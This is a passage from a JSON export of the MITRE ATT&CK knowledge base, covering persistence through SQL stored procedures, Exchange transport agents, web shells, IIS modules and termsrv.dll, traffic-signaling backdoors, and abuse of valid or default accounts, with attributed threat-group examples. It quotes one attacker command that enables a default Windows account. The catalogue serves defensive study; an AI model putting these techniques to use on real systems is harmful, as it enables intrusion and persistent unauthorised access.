the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).", "detailed_description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.", "id": "T1505.001", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used various MS-SQL stored procedures."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet used xp_cmdshell to store and execute SQL code."}]}, {"name": "Transport Agent", "description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.", "detailed_description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.", "id": "T1505.002", "examples": [{"id": "S0395", "name": "LightNeuron", "description": "LightNeuron has used a malicious Microsoft Exchange transport agent for persistence."}]}, {"name": "Web Shell", "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.", "detailed_description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).", "id": "T1505.003", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the Neo-REGEORG webshell on an internet-facing server."}, {"id": "G1030", "name": "Agrius", "description": "Agrius typically deploys a variant of the ASPXSpy web shell following initial access via exploitation."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server."}, {"id": "G0016", "name": "APT29", "description": "APT29 has installed web shells on exploited Microsoft Exchange servers."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used Web shells to maintain access to victim websites."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used web shells for persistence or to ensure redundant access."}, {"id": "G0087", "name": "APT39", "description": "APT39 has installed ANTAK and ASPXSPY web shells."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence."}, {"id": "G1023", "name": "APT5", "description": "APT5 has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances."}, {"id": "S0073", "name": "ASPXSpy", "description": "ASPXSpy is a Web shell. The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services (IIS)."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has used web shells to establish an initial foothold and for lateral movement within a victim's system."}, {"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK is a web shell that has the ability to execute arbitrary commands or write files."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles planted Web shells on Outlook Exchange servers."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component is a Web Shell payload."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has been linked to web shells following likely server compromise as an initial access vector into victim networks."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used multiple web shells to maintain presence on compromised Connect Secure appliances such as WIREFIRE, GLASSTOKEN, BUSHWALK, LIGHTWIRE, and FRAMESTING."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda uses Web shells on publicly accessible Web servers to access victim networks."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear deploys web shells following initial access for either follow-on command execution or protocol tunneling. Example web shells used by Ember Bear include P0wnyshell, reGeorg, P.A.S. Webshell, and custom variants of publicly-available web shell examples."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized obfuscated and open-source web shells such as JspSpy, reGeorg, MiniWebCmdShell, and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has installed web shells on compromised hosts to maintain access."}, {"id": "S1120", "name": "FRAMESTING", "description": "FRAMESTING is a web shell capable of enabling arbitrary command execution on compromised Ivanti Connect Secure VPNs."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration."}, {"id": "S1117", "name": "GLASSTOKEN", "description": "GLASSTOKEN is a web shell capable of tunneling C2 connections and code execution on compromised Ivanti Secure Connect VPNs."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and ASPXSpy."}, {"id": "C0038", "name": "HomeLand Justice", "description": "For HomeLand Justice, threat actors used .aspx webshells named pickers.aspx, error4.aspx, and ClientBin.aspx, to maintain persistence."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used modified versions of open source PHP web shells to maintain access, often adding \"Dinosaur\" references within the code."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems."}, {"id": "S1119", "name": "LIGHTWIRE", "description": "LIGHTWIRE is a web shell capable of command execution and establishing persistence on compromised Ivanti Secure Connect VPNs."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used multiple web shells to gain execution."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has dropped a web shell onto a compromised system."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used web shells, often to maintain access to a victim network."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390. It is installed as an ISAPI filter on Exchange servers and shares characteristics with the China Chopper Web shell."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can gain remote access and execution on target web servers."}, {"id": "S1108", "name": "PULSECHECK", "description": "PULSECHECK is a web shell that can enable command execution on compromised servers."}, {"id": "S1113", "name": "RAPIDPULSE", "description": "RAPIDPULSE is a web shell that is capable of arbitrary file read on targeted web servers to exfiltrate items of interest on the victim device."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks."}, {"id": "S0185", "name": "SEASHARPEE", "description": "SEASHARPEE is a Web shell."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE is a web shell that can read, write, and execute files on compromised servers."}, {"id": "S1112", "name": "STEADYPULSE", "description": "STEADYPULSE is a web shell that can enable the execution of arbitrary commands on compromised web servers."}, {"id": "S0578", "name": "SUPERNOVA", "description": "SUPERNOVA is a Web shell."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used a variety of Web shells."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has started a web service in the target host and wait for the adversary to connect, acting as a web shell."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation resulted in the deployment of the VersaMem web shell for follow-on activity."}, {"id": "G0123", "name": "Volatile Cedar", "description": "Volatile Cedar can inject web shell code into a server."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments."}, {"id": "S1115", "name": "WIREFIRE", "description": "WIREFIRE is a web shell that can download files to and execute arbitrary commands from compromised Ivanti Connect Secure VPNs."}]}, {"name": "IIS Components", "description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: Get{Extension/Filter}Version, Http{Extension/Filter}Proc, and (optionally) Terminate{Extension/Filter}. IIS modules may also be installed to extend IIS web servers.", "detailed_description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: Get{Extension/Filter}Version, Http{Extension/Filter}Proc, and (optionally) Terminate{Extension/Filter}. IIS modules may also be installed to extend IIS web servers.\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports RegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.", "id": "T1505.004", "examples": [{"id": "S1022", "name": "IceApple", "description": "IceApple is an IIS post-exploitation framework, consisting of 18 modules that provide several functionalities."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group targeted Windows servers running Internet Information Systems (IIS) to install C2 components."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL."}, {"id": "S0258", "name": "RGDoor", "description": "RGDoor establishes persistence on webservers as an IIS module."}]}, {"name": "Terminal Services DLL", "description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.", "detailed_description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.\nWindows Services that are run as a \"generic\" process (ex: svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry named ServiceDll. The termsrv.dll file, typically stored in %SystemRoot%\\System32\\, is the default ServiceDll value for Terminal Services in HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\.\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts. Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal termsrv.dll functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent Remote Desktop Protocol sessions by either patching the termsrv.dll file or modifying the ServiceDll value to point to a DLL that provides increased RDP functionality. On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.", "id": "T1505.005", "examples": []}]}, {"name": "Traffic Signaling", "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.", "detailed_description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\nOn network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.", "id": "T1205", "examples": [{"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK can modify the DSUserAgentCap.pm Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests."}, {"id": "S0220", "name": "Chaos", "description": "Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the /tmp/clientsDownload.sock socket."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command."}, {"id": "S0587", "name": "Penquin", "description": "Penquin will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement."}, {"id": "S0519", "name": "SYNful Knock", "description": "SYNful Knock can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific Uroburos implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can identify a specific string in intercepted network traffic, SSH-2.0-OpenSSH_0.3xx., to trigger its command functionality."}], "sub_techniques": [{"name": "Port Knocking", "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.", "detailed_description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.", "id": "T1205.001", "examples": [{"id": "S1060", "name": "Mafalda", "description": "Mafalda can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports."}]}, {"name": "Socket Filters", "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.", "detailed_description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.\nFilters can be installed on any Unix-like platform with libpcap installed or on Windows hosts using Winpcap.  Adversaries may use either libpcap with pcap_setfilter or the standard library function setsockopt with SO_ATTACH_FILTER options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.", "id": "T1205.002", "examples": [{"id": "S1161", "name": "BPFDoor", "description": "BPFDoor uses BPF bytecode to attach a filter to a network socket to view ICMP, UDP, or TCP packets coming through ports 22 (ssh), 80 (http), and 443 (https). When BPFDoor  finds a packet containing its \"magic\" bytes, it parses out two fields and forks itself. The parent process continues to monitor filtered traffic while the child process executes the instructions from the parsed fields."}, {"id": "S0587", "name": "Penquin", "description": "Penquin installs a TCP and UDP filter on the eth0 interface."}, {"id": "S1123", "name": "PITSTOP", "description": "PITSTOP can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at /data/runtime/cockpit/wd.fd for a predefined magic byte sequence. PITSTOP can then duplicate the socket for further communication over TLS."}]}]}, {"name": "Valid Accounts", "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.", "detailed_description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.", "id": "T1078", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. "}, {"id": "G1024", "name": "Akira", "description": "Akira uses valid account information to remotely access victim networks, such as VPN credentials."}, {"id": "G0026", "name": "APT18", "description": "APT18 actors leverage legitimate credentials to log into external remote services."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used a compromised account to access an organization's VPN infrastructure."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used valid accounts for initial access and privilege escalation."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA)."}, {"id": "G0096", "name": "APT41", "description": "APT41 used compromised credentials to log on to other systems."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used previously compromised administrative accounts to escalate privileges."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used compromised VPN accounts."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used a valid account to maintain persistence via scheduled task."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used compromised user accounts to deploy payloads and create system services."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compromised user credentials and used valid accounts for operations."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack used hard-coded credentials to gain access to a network share."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used legitimate credentials to hijack email communications."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment."}, {"id": "G0037", "name": "FIN6", "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has harvested valid administrative credentials for lateral movement."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used valid accounts for persistence and lateral movement."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used valid credentials with various services during lateral movement."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM leveraged valid accounts to maintain access to a victim network."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used a compromised Exchange account to search mailboxes and create new Exchange accounts."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used compromised valid accounts for access to victim environments."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used valid accounts for initial access and lateral movement. Indrik Spider has also maintained access to the victim environment through the VPN infrastructure."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer can use supplied user credentials to execute processes and stop services."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used valid SSH credentials to access remote hosts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has obtained valid accounts to gain initial access."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit acquires valid SSH accounts through brute force. "}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used compromised credentials to access other systems on a victim network."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access."}, {"id": "G0011", "name": "PittyTiger", "description": "PittyTiger attempts to obtain legitimate credentials during operations."}, {"id": "G1040", "name": "Play", "description": "Play has used valid VPN accounts to achieve initial access."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has used valid compromised credentials to gain access to victim environments."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks."}, {"id": "S0053", "name": "SeaDuke", "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials."}, {"id": "G0091", "name": "Silence", "description": "Silence has used compromised credentials to log on to other systems and escalate privileges."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used stolen credentials to sign into victim email accounts."}, {"id": "G0039", "name": "Suckfly", "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon relies primarily on valid credentials for persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers."}], "sub_techniques": [{"name": "Default Accounts", "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.", "detailed_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.", "id": "T1078.001", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has abused default user names and passwords in externally-accessible IP cameras for initial access."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can use default credentials to connect to IPC$ shares on remote machines."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound enabled and used the default system managed account, DefaultAccount, via \"powershell.exe\" /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet infected WinCC machines via a hardcoded database server password."}]}, {"name": "Domain Accounts", "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.", "detailed_description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.", "id": "T1078.002", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement."}, {"id": "G0022", "name": "APT3", "description": "APT3 leverages valid accounts after gaining credentials for use within the victim domain."}, 